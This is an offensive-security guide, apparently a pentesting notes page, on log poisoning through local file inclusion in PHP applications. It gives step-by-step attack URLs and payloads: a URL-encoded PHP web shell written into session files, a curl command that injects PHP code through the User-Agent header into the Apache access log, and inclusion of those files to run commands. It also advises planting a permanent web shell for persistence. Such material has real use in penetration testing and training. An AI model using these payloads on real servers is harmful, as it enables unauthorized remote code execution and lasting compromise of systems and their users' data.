# Log Poisoning

Log poisoning is a technique that exploits vulnerabilities in web applications by injecting malicious PHP code into log files. This code can then be executed through file inclusion vulnerabilities, allowing attackers to gain remote code execution. This section covers the methods of log poisoning, focusing on PHP session poisoning and server log poisoning.

***

### 🔍 PHP Session Poisoning

Most PHP applications use PHPSESSID cookies to manage user sessions, storing session data in files on the server. The session files are typically located in:

* **Linux**: `/var/lib/php/sessions/`
* **Windows**: `C:\Windows\Temp\`

#### Steps for PHP Session Poisoning

1.  **Identify the PHPSESSID Cookie**: Check the cookie value in your browser. For example, if the cookie is `nhhv8i0o6ua4g88bkdl9u1fdsd`, the session file will be located at:

    ```plaintext
    /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
    ```
2.  **Include the Session File**: Use the LFI vulnerability to view the session file's contents:

    {% code overflow="wrap" %}
    ```plaintext
    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
    ```
    {% endcode %}
3.  **Modify the Session Data**: Change the `page` value in the session file by visiting:

    ```plaintext
    http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
    ```
4.  **Poison the Session File**: Write PHP code to the session file by URL encoding the PHP web shell:

    {% code overflow="wrap" %}
    ```plaintext
    http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
    ```
    {% endcode %}
5.  **Execute Commands**: Include the session file again to execute commands:

    {% code overflow="wrap" %}
    ```plaintext
    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
    ```
    {% endcode %}

***

### 📜 Server Log Poisoning

Both Apache and Nginx maintain log files that can be exploited for log poisoning. The access logs contain information about requests, including the User-Agent header, which can be manipulated.

#### Steps for Server Log Poisoning

1.  **Include the Log File**: Attempt to read the Apache access log:

    ```plaintext
    http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
    ```
2.  **Modify the User-Agent Header**: Use Burp Suite or cURL to set a custom User-Agent that contains PHP code:

    <pre class="language-bash"><code class="lang-bash"><strong>echo -n "User-Agent: &#x3C;?php system(\$_GET['cmd']); ?>" > Poison
    </strong>curl -s "http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php" -H @Poison
    </code></pre>
3.  **Execute Commands**: Include the log file again to execute commands:

    ```plaintext
    http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
    ```

#### Additional Techniques

*   **Accessing Other Logs**: If you have read access to other logs, such as:

    * `/var/log/sshd.log`
    * `/var/log/mail`
    * `/var/log/vsftpd.log`

    You can attempt to poison these logs similarly by injecting PHP code into parameters that get logged.
*   **Using Process Files**: If log access is restricted, you can try including process files like:

    ```plaintext
    /proc/self/environ
    /proc/self/fd/N
    ```

    where `N` is a PID.

***

### ⚠️ Important Considerations

* **Log Size**: Be cautious when including large log files, as they may crash the server or take a long time to load.
* **Permissions**: Ensure you have the necessary permissions to read the logs or session files.
* **Persistence**: Consider writing a permanent web shell to the web directory for easier access in future interactions.

By understanding and exploiting log poisoning techniques, security professionals can better protect against these vulnerabilities and ensure the integrity of web applications.
